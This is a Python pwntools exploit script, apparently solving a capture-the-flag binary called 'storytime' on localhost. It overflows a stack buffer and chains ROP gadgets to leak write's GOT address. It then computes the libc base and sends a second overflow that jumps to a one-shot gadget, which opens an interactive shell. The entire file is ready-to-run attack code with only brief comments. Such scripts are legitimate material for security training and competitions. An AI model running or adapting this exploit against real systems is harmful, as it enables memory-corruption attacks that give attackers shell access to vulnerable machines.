from pwn import *

# Establish the libc version
exe = ELF("./storytime")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

#target = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

# gdb.attach(target, gdbscript = 'b *0x40060e')
target = remote("localhost", "12345")

#0x0000000000400701 : pop rsi ; pop r15 ; ret
popRsiR15 = p64(0x400701)

# objdump -t -T -r -R storytime | grep write@GLIBC
writeGot = p64(0x601018)

# Filler to reach the return address
payload = b"0"*0x38

# Pop the got entry of write into r15
payload += popRsiR15
payload += writeGot
payload += p64(0x3030303030303030) # Filler value will be popped into r15

# Right before write call in end
payload += p64(0x400601)

# Filler value that will be popped off in end
payload += p64(0x3030303030303030)

# Address of climax, we will exploit another buffer overflow to use the rop gadget
# Shift to new function, since there is no loop
payload += p64(0x40060e)

# Send the payload
target.sendline(payload)

# Scan in some of the output
print(target.recvuntil(b"Tell me a story: \n"))

# Scan in and filter out the libc infoleak, calculate base of libc
leak = u64(target.recv(8))
base = leak - libc.symbols["write"]
print(hex(base))

# Calculate the oneshot gadget
oneshot = base + 0x4526a

# Make the payload for the onshot gadget
payload = b"1"*0x38 + p64(oneshot)

# Send it and get a shell
target.sendline(payload)
target.interactive()